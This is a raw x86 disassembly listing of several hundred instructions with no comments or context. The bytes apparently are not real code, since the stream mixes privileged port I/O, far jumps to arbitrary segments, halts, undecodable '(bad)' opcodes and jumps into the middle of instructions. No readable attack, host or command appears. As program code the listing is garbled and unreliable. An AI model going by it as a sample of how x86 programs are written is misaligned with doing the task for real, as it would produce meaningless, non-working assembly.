  42787a:	inc    eax
  42787b:	jo     0x4278ba
  42787d:	xchg   edx,eax
  42787e:	imul   esp,esi,0xc863a56c
  427884:	dec    edx
  427885:	inc    edx
  427886:	scas   al,BYTE PTR es:[edi]
  427887:	lds    ecx,FWORD PTR [ecx+0x431ba2]
  42788d:	inc    esi
  42788e:	test   esp,esi
  427890:	mov    WORD PTR [eax+0x4e],ss
  427893:	out    0xeb,al
  427895:	push   ebp
  427896:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427897:	xchg   ebp,eax
  427898:	mov    ebx,0x4ff44533
  42789d:	test   eax,0xdacee3eb
  4278a2:	ret    0x5bd3
  4278a5:	in     al,0x6a
  4278a7:	in     al,0x12
  4278a9:	sub    ch,cl
  4278ab:	retf   0xa5a3
  4278ae:	jecxz  0x427847
  4278b0:	call   0xe0e5:0x15e71a4d
  4278b7:	in     al,dx
  4278b8:	lea    eax,[ebp+ecx*4-0x7a184890]
  4278bf:	les    ebp,FWORD PTR [ecx]
  4278c1:	ds jmp 0x4278a8
  4278c4:	fwait
  4278c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4278c6:	jbe    0x42793b
  4278c8:	ins    DWORD PTR es:[edi],dx
  4278c9:	pop    edi
  4278ca:	scas   al,BYTE PTR es:[edi]
  4278cb:	pop    ebx
  4278cc:	mov    fs,WORD PTR [ecx+0x2d9c2a8b]
  4278d2:	rol    esp,0x21
  4278d5:	repnz inc ecx
  4278d7:	inc    eax
  4278d8:	inc    edi
  4278d9:	sub    ch,0x84
  4278dc:	pop    ds
  4278dd:	and    ah,bh
  4278df:	cli    
  4278e0:	cmc    
  4278e1:	jnp    0x427920
  4278e3:	pop    ss
  4278e4:	jno    0x42793e
  4278e6:	adc    DWORD PTR ds:0xe5226b33,0x24
  4278ed:	aas    
  4278ee:	stc    
  4278ef:	shl    edx,cl
  4278f1:	dec    edi
  4278f2:	sub    al,0x59
  4278f4:	sub    ah,BYTE PTR [esi+0x2cfdc5ad]
  4278fa:	ins    DWORD PTR es:[edi],dx
  4278fb:	hlt    
  4278fc:	xchg   BYTE PTR [edx+0x580be70b],bl
  427902:	loopne 0x4278cc
  427904:	lods   al,BYTE PTR ds:[esi]
  427905:	adc    BYTE PTR [edx+ebx*2+0x64e61088],ch
  42790c:	cwde   
  42790d:	das    
  42790e:	add    eax,0x21886058
  427913:	cli    
  427914:	and    al,0x85
  427916:	and    DWORD PTR [esi+eiz*8+0x7302224e],0x3a
  42791e:	inc    ecx
  42791f:	pop    ss
  427920:	push   ebp
  427921:	ret    
  427922:	cmp    eax,0xb415946b
  427927:	xchg   esp,eax
  427928:	adc    ch,BYTE PTR [eax]
  42792a:	jns    0x4278e9
  42792c:	fcomp  QWORD PTR es:[eax-0x22]
  427930:	pop    es
  427931:	sub    BYTE PTR [ecx-0x4a7b4044],al
  427937:	repnz mul bh
  42793a:	and    eax,0xbb923cd9
  42793f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427940:	lahf   
  427941:	push   edx
  427942:	lods   al,BYTE PTR ds:[esi]
  427943:	jnp    0x427932
  427945:	inc    esp
  427946:	repz and eax,0xeb03ec65
  42794c:	push   eax
  42794d:	pop    ebx
  42794e:	stc    
  42794f:	out    0x24,eax
  427951:	mov    DWORD PTR [esi+0x63],eax
  427954:	sub    BYTE PTR [esi+eax*1-0x2b5e634e],0x75
  42795c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42795d:	xchg   ebx,eax
  42795e:	ror    BYTE PTR [edi],cl
  427960:	cmc    
  427961:	sbb    eax,0x490af886
  427966:	mov    ebx,0xa0c43eaa
  42796b:	adc    eax,0xf11ea531
  427970:	and    al,0x57
  427972:	in     al,dx
  427973:	push   0xffffffd8
  427975:	adc    DWORD PTR [ecx],esp
  427977:	dec    ecx
  427978:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427979:	xor    al,0xba
  42797b:	cmp    al,0x1b
  42797d:	jmp    0xb2082340
  427982:	xchg   edx,eax
  427983:	test   BYTE PTR [ebx],ah
  427985:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427986:	sub    ecx,DWORD PTR [esp+esi*1-0x7cfa5f2]
  42798d:	in     al,dx
  42798e:	loopne 0x427914
  427990:	lock fwait
  427992:	xchg   ebx,eax
  427993:	jne    0x4279ae
  427995:	and    eax,0xc60ec7b7
  42799a:	loopne 0x427929
  42799c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42799d:	popa   
  42799e:	jge    0x4279a2
  4279a0:	pop    eax
  4279a1:	mov    edi,0xf1a73ce6
  4279a6:	push   esp
  4279a7:	lock xor BYTE PTR [ecx],dl
  4279aa:	mov    esi,0x3f8ec5c4
  4279af:	and    ch,ch
  4279b1:	aad    0xeb
  4279b3:	jbe    0x4279ae
  4279b5:	push   0x71
  4279b7:	inc    ebx
  4279b8:	xchg   ebx,eax
  4279b9:	(bad)  
  4279ba:	stc    
  4279bb:	mul    BYTE PTR [edx]
  4279bd:	ja     0x4279d6
  4279bf:	jmp    0x42795c
  4279c1:	into   
  4279c2:	mov    ds:0x54c4d626,al
  4279c7:	iret   
  4279c8:	fcomp  DWORD PTR [edi+0x6b]
  4279cb:	pop    ebp
  4279cc:	pop    edx
  4279cd:	xchg   BYTE PTR [eax-0x70cba6a],dh
  4279d3:	in     al,dx
  4279d4:	aad    0x40
  4279d6:	mov    esi,0x29a91c38
  4279db:	bnd jb 0x427a53
  4279de:	aam    0xc4
  4279e0:	cli    
  4279e1:	mov    ?,WORD PTR [edi+ecx*8+0x7a]
  4279e5:	icebp  
  4279e6:	popf   
  4279e7:	jecxz  0x427a29
  4279e9:	or     bh,al
  4279eb:	in     al,dx
  4279ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4279ed:	into   
  4279ee:	cld    
  4279ef:	repz inc ebx
  4279f1:	xchg   esp,eax
  4279f2:	jecxz  0x427a58
  4279f4:	cmp    ebx,DWORD PTR [ecx]
  4279f6:	mov    edx,eax
  4279f8:	call   0xb16b:0x964eac18
  4279ff:	jns    0x4279fb
  427a01:	mov    dh,0x7c
  427a03:	jmp    0x4279d2
  427a05:	stc    
  427a06:	adc    BYTE PTR [ecx-0x481c66c1],dl
  427a0c:	inc    esp
  427a0d:	inc    edi
  427a0e:	push   esp
  427a0f:	sbb    dh,al
  427a11:	push   esi
  427a12:	lahf   
  427a13:	sbb    ecx,DWORD PTR [ecx-0x593a79f5]
  427a19:	std    
  427a1a:	cmp    eax,0x89077db1
  427a1f:	lods   al,BYTE PTR ds:[esi]
  427a20:	scas   eax,DWORD PTR es:[edi]
  427a21:	adc    BYTE PTR [ebx-0x64c4607a],cl
  427a27:	mov    dh,0xea
  427a29:	std    
  427a2a:	mov    al,0x94
  427a2c:	cmp    BYTE PTR [esi-0x6eea0f11],ah
  427a32:	jnp    0x427a21
  427a34:	call   0xecd77af3
  427a39:	sub    dl,BYTE PTR [ecx-0x42]
  427a3c:	dec    eax
  427a3d:	cmp    eax,0xcd7ed3d4
  427a42:	sub    bh,BYTE PTR [ebx]
  427a44:	jno    0x4279fa
  427a46:	dec    esi
  427a47:	out    dx,eax
  427a48:	(bad)  ds:0xe6845c3c
  427a4e:	jl     0x427a42
  427a50:	ds jle 0x427a08
  427a53:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427a54:	and    al,0xc9
  427a56:	push   esi
  427a57:	cmp    eax,0x26492286
  427a5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427a5d:	cdq    
  427a5e:	mov    ebx,0x7093cf8f
  427a63:	ins    DWORD PTR es:[edi],dx
  427a64:	sbb    al,BYTE PTR [edi]
  427a66:	fimul  WORD PTR [ecx]
  427a68:	pop    ds
  427a69:	mov    ebp,edx
  427a6b:	retf   
  427a6c:	test   eax,0x94ff70f4
  427a71:	adc    edi,DWORD PTR [ecx+edx*8-0x40]
  427a75:	lock xchg edx,eax
  427a77:	cli    
  427a78:	(bad)
  427a7c:	sbb    cl,BYTE PTR [ecx-0x7c]
  427a7f:	inc    eax
  427a80:	(bad)  
  427a81:	pop    esp
  427a82:	mov    ebx,0x5a3d294f
  427a87:	gs push ebp
  427a89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427a8a:	cwde   
  427a8b:	in     eax,dx
  427a8c:	push   eax
  427a8d:	sub    BYTE PTR [edi+ecx*1-0x246e2fc9],ch
  427a94:	xlat   BYTE PTR ds:[ebx]
  427a95:	push   ss
  427a96:	mov    ebx,0x64a46ff4
  427a9b:	cdq    
  427a9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427a9d:	xor    edi,DWORD PTR ds:0xd85523cf
  427aa3:	clc    
  427aa4:	stc    
  427aa5:	push   cs
  427aa6:	jecxz  0x427aec
  427aa8:	add    BYTE PTR [edx-0x30],cl
  427aab:	sub    edi,DWORD PTR [edi]
  427aad:	test   al,0x9b
  427aaf:	stos   DWORD PTR es:[edi],eax
  427ab0:	xor    DWORD PTR [edi+0x53],esi
  427ab3:	pop    esp
  427ab4:	pusha  
  427ab5:	addr16 jo 0x427aa8
  427ab8:	hlt    
  427ab9:	sub    al,al
  427abb:	mov    bl,0x79
  427abd:	mov    ebp,0xb78ff3bd
  427ac2:	in     eax,0x57
  427ac4:	cmp    esi,DWORD PTR [edx-0x41]
  427ac7:	test   BYTE PTR [edi+0x61],bl
  427aca:	push   esp
  427acb:	daa    
  427acc:	cmc    
  427acd:	push   ss
  427ace:	mov    ds:0x44f34cf4,eax
  427ad3:	add    DWORD PTR [ebx],edi
  427ad5:	dec    edx
  427ad6:	ret    0x9515
  427ad9:	test   eax,0x298d55e4
  427ade:	sub    dl,al
  427ae0:	fiadd  DWORD PTR [ecx-0x4b]
  427ae3:	sti    
  427ae4:	gs jmp 0xabbd:0x3f4fe4ea
  427aec:	and    DWORD PTR [ecx],edi
  427aee:	mov    al,0x12
  427af0:	aam    0x93
  427af2:	fucomip st,st(0)
  427af4:	mov    esp,0xe84eace0
  427af9:	test   al,0x56
  427afb:	push   edi
  427afc:	inc    esi
  427afd:	xchg   ecx,eax
  427afe:	sub    esi,ebp
  427b00:	pop    ds
  427b01:	jg     0x427a86
  427b03:	fst    QWORD PTR [eax-0x3e]
  427b06:	gs aaa 
  427b08:	ficom  WORD PTR [eax+0x5b3124b1]
  427b0e:	and    al,0x75
  427b10:	inc    di
  427b12:	rcl    BYTE PTR [ebp+0x2217921],1
  427b18:	(bad)  
  427b19:	cmp    eax,0xc99467d9
  427b1e:	aam    0x72
  427b20:	jg     0x427b36
  427b22:	ja     0x427b66
  427b24:	in     al,dx
  427b25:	mov    eax,0xa8e4d2bb
  427b2a:	jnp    0x427ad8
  427b2c:	mov    ds:0x54e10c1c,al
  427b31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427b32:	mov    ecx,0xb2f4bca6
  427b37:	aam    0x8c
  427b39:	cmp    ecx,DWORD PTR [eax-0x11]
  427b3c:	in     eax,0x37
  427b3e:	add    edi,eax
  427b40:	mov    dh,0x21
  427b42:	or     BYTE PTR [ebx],dl
  427b44:	and    DWORD PTR [ebx],0xffffffc2
  427b47:	in     al,0xe9
  427b49:	sbb    eax,ecx
  427b4b:	je     0x427b78
  427b4d:	stos   BYTE PTR es:[edi],al
  427b4e:	inc    ecx
  427b50:	outs   dx,DWORD PTR ds:[esi]
  427b51:	pop    edx
  427b52:	jp     0x427b25
  427b54:	cmc    
  427b55:	cwde   
  427b56:	xor    ah,dh
  427b58:	pusha  
  427b59:	jno    0x427b01
  427b5b:	test   al,0x69
  427b5d:	cmp    DWORD PTR [ebx+0x274bd2b4],eax
  427b63:	shl    DWORD PTR [eax-0x5b],1
  427b66:	mov    eax,ds:0xc07cb2b5
  427b6b:	imul   DWORD PTR [edx+0x2074270a]
  427b71:	out    dx,eax
  427b72:	mov    bh,0xc4
  427b74:	outs   dx,DWORD PTR ds:[esi]
  427b75:	cmp    eax,0x1b5103bc
  427b7a:	mov    ebp,0x7af1a0c4
  427b7f:	pop    esi
  427b80:	push   ss
  427b81:	div    BYTE PTR [edx+0x110a6359]
  427b87:	(bad)  
  427b88:	or     al,0x54
  427b8a:	dec    esi
  427b8b:	mov    BYTE PTR [esi],0x20
  427b8e:	mov    esp,0x9a491d10
  427b93:	loop   0x427b81
  427b95:	sub    eax,edi
  427b97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427b98:	xchg   BYTE PTR [esi-0x1336de55],bl
  427b9e:	fndisi(8087 only) 
  427ba0:	les    esi,FWORD PTR [ebp+esi*8-0x5c4d20a3]
  427ba7:	dec    eax
  427ba8:	sahf   
  427ba9:	jb     0x427b56
  427bab:	pop    esp
  427bac:	and    DWORD PTR [esi+0x28f73b38],eax
  427bb2:	stos   BYTE PTR es:[edi],al
  427bb3:	fst    QWORD PTR [ecx+0x5e]
  427bb6:	and    eax,0x4c2543e6
  427bbb:	cld    
  427bbc:	icebp  
  427bbd:	jl     0x427b8e
  427bbf:	inc    esp
  427bc0:	sahf   
  427bc1:	mov    eax,DWORD PTR [eax*8-0x5c00d69f]
  427bc8:	jecxz  0x427b6a
  427bca:	retf   
  427bcb:	and    edx,0xfb2af0e9
  427bd1:	loope  0x427baf
  427bd3:	rol    DWORD PTR [esi],cl
  427bd5:	push   ds
  427bd6:	mov    edi,0xed464704
  427bdb:	pop    ecx
  427bdc:	lds    ecx,FWORD PTR [ebx-0x7eaf0d93]
  427be2:	cmp    edx,edi
  427be4:	pop    ss
  427be5:	mov    ecx,0xf58a1114
  427bea:	sub    al,0xfc
  427bec:	xor    ecx,edx
  427bee:	stos   DWORD PTR es:[edi],eax
  427bef:	mov    ecx,0xcace5d9
  427bf4:	sahf   
  427bf5:	xchg   BYTE PTR [esp+edi*4-0x79],bh
  427bf9:	or     DWORD PTR ds:0xfe4224e2,ecx
  427bff:	push   0xcfbf7f91
  427c04:	mov    ah,0xa5
  427c06:	dec    ebx
  427c07:	call   0x31361e9a
  427c0c:	cmp    esp,ebx
  427c0e:	in     eax,0xf
  427c10:	mov    ebp,0x5c4bced
  427c15:	stos   WORD PTR es:[edi],ax
  427c17:	and    BYTE PTR [ebp-0x3815859d],ah
  427c1d:	in     eax,0xb9
  427c1f:	dec    ebp
  427c20:	mov    ebp,0x18a8b8e0
  427c25:	sub    DWORD PTR [ebx+0x38cc2f84],edx
  427c2b:	pop    edi
  427c2c:	jp     0x427c23
  427c2e:	sbb    esp,DWORD PTR [edx-0x55]
  427c31:	(bad)  
  427c32:	ficomp DWORD PTR [esi-0x15ffac23]
  427c38:	push   ds
  427c39:	or     DWORD PTR [esi-0x50],esp
  427c3c:	cmp    bl,bl
  427c3e:	aam    0xe7
  427c40:	pop    ebp
  427c41:	or     DWORD PTR [edi+0x2f],0xb
  427c45:	add    eax,0x76aeb8c
  427c4a:	mov    al,0xec
  427c4c:	mul    BYTE PTR [edi-0x5b]
  427c4f:	inc    ebx
  427c50:	jns    0x427c54
  427c52:	mov    ebx,0x2f02c1b4
  427c57:	jmp    0xe5801be1
  427c5c:	cmp    al,0xfb
  427c5e:	clc    
  427c5f:	sbb    BYTE PTR [ebp-0x45],0x40
  427c63:	sbb    eax,0x66fc591d
  427c68:	out    0x1e,eax
  427c6a:	push   ecx
  427c6b:	inc    esi
  427c6c:	(bad)
  427c6f:	repnz dec edi
  427c71:	push   esi
  427c72:	int3   
  427c73:	retf   0x9af6
  427c76:	cmp    BYTE PTR ds:0xc241cd8f,ah
  427c7c:	sub    bl,dl
  427c7e:	loop   0x427c77
  427c80:	and    edi,eax
  427c82:	jecxz  0x427c94
  427c84:	cmc    
  427c85:	mov    ebx,0x3bcced32
  427c8a:	or     eax,0xe04921c2
  427c8f:	xchg   esi,eax
  427c90:	add    esp,DWORD PTR [edi*8+0x6b9dde90]
  427c97:	add    ah,BYTE PTR [eax+0x69]
  427c9a:	pop    eax
  427c9b:	clc    
  427c9c:	push   ds
  427c9d:	retf   
  427c9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427c9f:	shl    bh,cl
  427ca1:	lods   eax,DWORD PTR ds:[esi]
  427ca2:	and    dl,BYTE PTR [ebp+0x4b63ea19]
  427ca8:	dec    edx
  427caa:	stos   DWORD PTR es:[edi],eax
  427cab:	inc    ecx
  427cac:	xchg   ecx,eax
  427cad:	dec    ebp
  427cae:	addr16 ret 0xc21a
  427cb2:	mov    ebp,DWORD PTR [eax+0x75effb58]
  427cb8:	retf   0x4659
  427cbb:	jns    0x427cd2
  427cbd:	jge    0x427ca1
  427cbf:	repz mov ebx,DWORD PTR [ebp+0x5a3eae9b]
  427cc6:	inc    edx
  427cc7:	aam    0x4f
  427cc9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427cca:	pop    ebp
  427ccb:	not    DWORD PTR [eax+0x1d]
  427cce:	sub    DWORD PTR ds:0x1c05a18,edx
  427cd4:	sub    cl,dl
  427cd6:	sti    
  427cd7:	push   edi
  427cd8:	ror    bh,0xdc
  427cdb:	cli    
  427cdc:	and    BYTE PTR [edi+0x39194851],al
  427ce2:	aad    0x6e
  427ce4:	inc    eax
  427ce5:	or     DWORD PTR [ebx+0x2ba8c173],ebx
  427ceb:	popa   
  427cec:	jnp    0x427cfb
  427cee:	not    ch
  427cf0:	in     al,dx
  427cf1:	sbb    eax,edi
  427cf3:	mov    edx,0x14bf2ec4
  427cf8:	sub    BYTE PTR [ebp-0x6b5a03a2],bl
  427cfe:	adc    eax,0x799a7ef0
  427d03:	jo     0x427d22
  427d05:	stc    
  427d06:	push   edx
  427d07:	daa    
  427d08:	std    
  427d09:	pusha  
  427d0a:	out    dx,al
  427d0b:	adc    DWORD PTR [edx+0x43],ecx
  427d0e:	das    
  427d0f:	into   
  427d10:	or     edi,DWORD PTR [edx+0x31bf43d]
  427d16:	sbb    eax,0x63c5426f
  427d1b:	addr16 push esi
  427d1d:	push   ss
  427d1e:	mov    esi,0xfacb02f4
  427d23:	jnp    0x427d5a
  427d25:	dec    edi
  427d26:	dec    esp
  427d27:	push   cs
  427d28:	je     0x427da6
  427d2a:	mov    al,ds:0xc4db4d1f
  427d2f:	xchg   esp,eax
  427d30:	jb     0x427cb4
  427d32:	add    ch,BYTE PTR [edi]
  427d34:	scas   al,BYTE PTR es:[edi]
  427d35:	in     al,dx
  427d36:	mov    eax,0x433b2574
  427d3b:	pop    ds
  427d3c:	cmc    
  427d3d:	fcom   QWORD PTR [ebx-0xe]
  427d40:	mov    ebp,0x1b543703
  427d45:	jo     0x427d4e
  427d47:	test   al,0x8
  427d49:	sub    al,0xb1
  427d4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427d4c:	icebp  
  427d4d:	mov    ds:0xd95126f,al
  427d52:	sub    edx,0x41
  427d55:	xor    eax,DWORD PTR [esi+ecx*4]
  427d58:	and    ecx,ebx
  427d5a:	xchg   DWORD PTR [ebp-0x42],ebx
  427d5d:	pop    ecx
  427d5e:	pop    esi
  427d5f:	sbb    BYTE PTR [esi-0x5a],bl
  427d62:	jnp    0x427dbe
  427d64:	outs   dx,BYTE PTR ds:[esi]
  427d65:	mov    edi,0x152ef6bd
  427d6a:	sub    ebp,ecx
  427d6c:	pop    es
  427d6d:	sub    dl,BYTE PTR [edx-0x7d]
  427d70:	rcr    DWORD PTR [eax],1
  427d72:	adc    BYTE PTR [edi],dh
  427d74:	and    DWORD PTR [edi+0x3dc528a0],ecx
  427d7a:	add    edx,esp
  427d7c:	and    eax,0xe7eb99d3
  427d81:	push   0xffffffb1
  427d83:	cmp    bl,BYTE PTR [ebx]
  427d85:	jmp    0x3afd1293
  427d8a:	ja     0x427d58
  427d8c:	aaa    
  427d8d:	mov    ds:0x5520ceab,al
  427d92:	ret    
  427d93:	data16 (bad) [edx]
  427d96:	xor    DWORD PTR [eax-0x6b121425],edx
  427d9c:	aas    
  427d9d:	and    BYTE PTR [ecx],bh
  427d9f:	xor    al,BYTE PTR [ecx+0x8]
  427da2:	mov    bl,0x46
  427da4:	aas    
  427da5:	aad    0xe
  427da7:	out    dx,al
  427da8:	mov    ch,0x1c
  427daa:	mov    ebp,gs
  427dac:	cwde   
  427dad:	not    DWORD PTR [eax-0x5a54a221]
  427db3:	stos   DWORD PTR es:[edi],eax
  427db4:	pop    ds
  427db5:	dec    ecx
  427db6:	fdivrp st(6),st
  427db8:	int    0x85
  427dba:	imul   esi,ebp,0xffffffd6
  427dbd:	es fs pop eax
  427dc0:	add    esp,edx
  427dc2:	jle    0x427d7d
  427dc4:	xchg   edi,eax
  427dc5:	push   ebx
  427dc6:	(bad)
  427dca:	sub    dl,cl
  427dcc:	cmp    eax,0x7797bd6b
  427dd1:	jns    0x427d88
  427dd3:	imul   BYTE PTR [ecx]
  427dd5:	sbb    BYTE PTR [eax+ebp*4],bh
  427dd8:	das    
  427dd9:	lds    esi,FWORD PTR [ecx+0x4935cadc]
  427ddf:	imul   esi,DWORD PTR [eax-0x35],0xa7bbe4e3
  427de6:	jne    0x427d94
  427de8:	inc    ebx
  427de9:	popf   
  427dea:	and    BYTE PTR ds:0xeac24f55,0x1c
  427df1:	fdivr  st,st(1)
  427df3:	test   BYTE PTR [edi+0x39],dl
  427df6:	clc    
  427df7:	pop    edi
  427df8:	mov    bh,0x64
  427dfa:	cs sbb eax,0xccbdf2d9
  427e00:	push   cs
  427e01:	popf   
  427e02:	pop    ebx
  427e03:	in     al,dx
  427e04:	out    dx,eax
  427e05:	lock adc cl,BYTE PTR [esi-0x2f5b4f4f]
  427e0c:	push   edx
  427e0d:	push   ebp
  427e0e:	lahf   
  427e0f:	cmc    
  427e10:	jge    0x427e8c
  427e12:	adc    esi,edx
  427e14:	ret    
  427e15:	popf   
  427e16:	cmp    ebp,esi
  427e18:	imul   edx,DWORD PTR [edx-0x30a4d5da],0x42401e7c
  427e22:	jns    0x427dea
  427e24:	iret   
  427e25:	mov    dh,0xbc
  427e27:	aam    0x34
  427e29:	test   al,0xb
  427e2b:	sub    eax,0xea0b6b96
  427e30:	pop    ebx
  427e31:	mov    ch,ch
  427e33:	test   BYTE PTR [eax],bl
  427e35:	imul   esp,DWORD PTR [edx],0xac7de90c
  427e3b:	je     0x427dd9
  427e3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427e3e:	sub    eax,DWORD PTR [ebx]
  427e40:	xor    BYTE PTR [edi],dl
  427e42:	in     eax,dx
  427e43:	sub    bh,dh
  427e45:	mov    ebx,0x7340b9d7
  427e4a:	mov    cl,0x14
  427e4c:	scas   al,BYTE PTR es:[edi]
  427e4d:	pop    ebp
  427e4e:	xchg   edx,eax
  427e4f:	sbb    eax,0xec115eb5
  427e54:	jae    0x427de1
  427e56:	mov    ebp,0x61d91f9d
  427e5b:	sbb    eax,DWORD PTR [ebx+ebp*2+0x41]
  427e5f:	cli    
  427e60:	loopne 0x427e95
  427e62:	dec    DWORD PTR [esi+esi*1-0x29855697]
  427e69:	jg     0x427e19
  427e6b:	ret    
  427e6c:	dec    esi
  427e6d:	lahf   
  427e6e:	mov    al,0xec
  427e70:	sub    ebp,DWORD PTR [eax-0x6f16c41e]
  427e76:	sahf   
  427e77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427e78:	in     eax,dx
  427e79:	daa    
  427e7a:	lods   eax,DWORD PTR ds:[esi]
  427e7b:	jbe    0x427e17
  427e7d:	(bad)  
  427e7e:	es sub eax,0x48b402fb
  427e84:	mov    edi,0x726cfc09
  427e89:	fadd   DWORD PTR [edx+0x70e781e8]
  427e8f:	jmp    0x3bc0:0x4b2d191f
  427e96:	dec    esp
  427e97:	sbb    BYTE PTR [eax-0x58],bh
  427e9a:	mov    ecx,0x75b0c9bc
  427e9f:	ror    BYTE PTR [edx],0xa0
  427ea2:	sti    
  427ea3:	outs   dx,BYTE PTR ds:[esi]
  427ea4:	lea    edx,[ebx]
  427ea6:	das    
  427ea7:	mov    bh,0xd
  427ea9:	fcmovbe st,st(0)
  427eab:	test   al,0xec
  427ead:	test   al,0x25
  427eaf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427eb0:	dec    edx
  427eb1:	cmp    BYTE PTR [ecx],ah
  427eb3:	cdq    
  427eb4:	dec    ecx
  427eb5:	out    dx,eax
  427eb6:	xchg   esi,eax
  427eb7:	retf   0x5b03
  427eba:	mov    bh,0xd4
  427ebc:	cmp    esp,edi
  427ebe:	pop    edi
  427ebf:	cld    
  427ec0:	loop   0x427ed3
  427ec2:	jecxz  0x427ef8
  427ec4:	cli    
  427ec5:	sbb    DWORD PTR [eax+eiz*2],esp
  427ec8:	out    0xa1,eax
  427eca:	retf   
  427ecb:	xchg   ebp,eax
  427ecc:	mov    al,BYTE PTR [esi+0x581419ae]
  427ed2:	xor    edx,DWORD PTR ds:0x24b05697
  427ed8:	dec    esp
  427ed9:	inc    esp
  427eda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427edb:	retf   0x9c5c
  427ede:	fcomi  st,st(6)
  427ee0:	inc    edi
  427ee1:	mov    ecx,0xd81c158e
  427ee6:	aam    0xac
  427ee8:	add    edx,DWORD PTR [ecx-0x661acb2c]
  427eee:	cdq    
  427eef:	and    ah,dh
  427ef1:	cdq    
  427ef2:	sub    esp,DWORD PTR [ecx+edx*1+0x1ac0ad1c]
  427ef9:	push   edx
  427efa:	inc    ecx
  427efb:	out    0xd8,al
  427efd:	popf   
  427efe:	mov    ebp,0x62d5f14
  427f03:	stc    
  427f04:	xor    eax,0xb0f33aaf
  427f09:	or     cl,BYTE PTR [edx+0x5b]
  427f0c:	and    DWORD PTR [ecx],edi
  427f0e:	iret   
  427f0f:	mov    edi,0x54937cb
  427f14:	int3   
  427f15:	fwait
  427f16:	jnp    0x427f50
  427f18:	jns    0x427ea8
  427f1a:	cwde   
  427f1b:	pop    edx
  427f1c:	mov    ds:0x199f0be9,eax
  427f21:	push   cs
  427f22:	mov    ah,0xd4
  427f24:	out    0x5a,eax
  427f26:	or     eax,0x24d02547
  427f2b:	jmp    0x3ddb3dcc
  427f30:	and    BYTE PTR [ecx-0x58],bh
  427f33:	jp     0x427f59
  427f35:	push   ss
  427f36:	adc    edi,eax
  427f38:	aam    0x99
  427f3a:	sbb    ecx,DWORD PTR [edi+0x5b565b21]
  427f40:	adc    esp,DWORD PTR [edi+0x7b]
  427f43:	rcr    DWORD PTR [ebx-0x60e7ac5f],1
  427f49:	jge    0x427f52
  427f4b:	imul   ebx,DWORD PTR [ecx],0xffffff9f
  427f4e:	or     eax,DWORD PTR [eax+ebp*8-0x26]
  427f52:	cmp    bl,BYTE PTR [eax]
  427f54:	dec    esi
  427f55:	js     0x427f0c
  427f57:	shl    esi,0x70
  427f5a:	mov    dh,0xa4
  427f5c:	adc    DWORD PTR [esi-0x2a],esp
  427f5f:	mov    al,0xa5
  427f61:	sbb    BYTE PTR [ebp+0x5daa87e6],ah
  427f67:	inc    esp
  427f68:	and    DWORD PTR [ecx+0x174fbe59],ebx
  427f6e:	fnstenv [ebp-0x7d64608d]
  427f74:	fdivr  QWORD PTR [edx-0x281376a7]
  427f7a:	jmp    0xf34:0xb269b9f4
  427f81:	adc    DWORD PTR [ebx],ebx
  427f83:	push   edi
  427f84:	std    
  427f85:	test   al,0x4b
  427f87:	mov    al,0x3f
  427f89:	mov    ds:0x79c0980,eax
  427f8e:	hlt    
  427f8f:	ins    DWORD PTR es:[edi],dx
  427f90:	xchg   edx,eax
  427f91:	jl     0x427fdf
  427f93:	mov    ch,0x5
  427f95:	add    eax,0x9b62f3dc
  427f9a:	stos   DWORD PTR es:[edi],eax
  427f9b:	push   esp
  427f9c:	lds    ebx,FWORD PTR [edx+0x2b]
  427f9f:	popf   
  427fa0:	add    ch,cl
  427fa2:	es jg  0x427fc4
  427fa5:	and    BYTE PTR gs:[ebp+0x1b],al
  427fa9:	jbe    0x427f7c
  427fab:	jle    0x427f72
  427fad:	pushf  
  427fae:	sbb    esi,DWORD PTR [ebp-0x2e0953c6]
  427fb4:	sar    DWORD PTR [esi],1
  427fb6:	aaa    
  427fb7:	(bad)  
  427fb8:	adc    esi,DWORD PTR [ecx-0x6672fb18]
  427fbe:	or     dh,bh
  427fc0:	sub    al,0x9b
  427fc2:	jmp    0x427fbe
  427fc4:	lahf   
  427fc5:	iret   
  427fc6:	push   esp
  427fc7:	inc    ecx
  427fc8:	mov    fs,ecx
  427fca:	adc    eax,0x8dd1dce2
  427fcf:	xchg   esi,eax
  427fd0:	push   edx
  427fd1:	push   esp
  427fd2:	shr    DWORD PTR [ebx+edi*4],cl
  427fd5:	(bad)  
  427fd6:	loopne 0x427fbd
  427fd8:	and    eax,0x77f49057
  427fdd:	das    
  427fde:	test   BYTE PTR [eax+0x7ce4894b],bl
  427fe4:	add    BYTE PTR [ebx+0x6b],dh
  427fe7:	lods   eax,DWORD PTR ds:[esi]
  427fe8:	mov    ds:0xe568401b,eax
  427fed:	repnz outs dx,BYTE PTR ds:[esi]
  427fef:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427ff1:	and    al,0x54
  427ff3:	not    BYTE PTR [edi]
  427ff5:	sbb    DWORD PTR [ecx-0x66daf0ca],esi
  427ffb:	scas   al,BYTE PTR es:[edi]
  427ffc:	pop    ecx
  427ffd:	and    al,0x25
  427fff:	mov    dh,0x15
  428001:	adc    DWORD PTR [ecx-0xe],ecx
  428004:	into   
  428005:	inc    ebx
  428006:	mov    esi,DWORD PTR [edi+0x1f]
  428009:	mov    DWORD PTR [ecx-0x22],esp
  42800c:	xchg   ecx,eax
  42800d:	loopne 0x428062
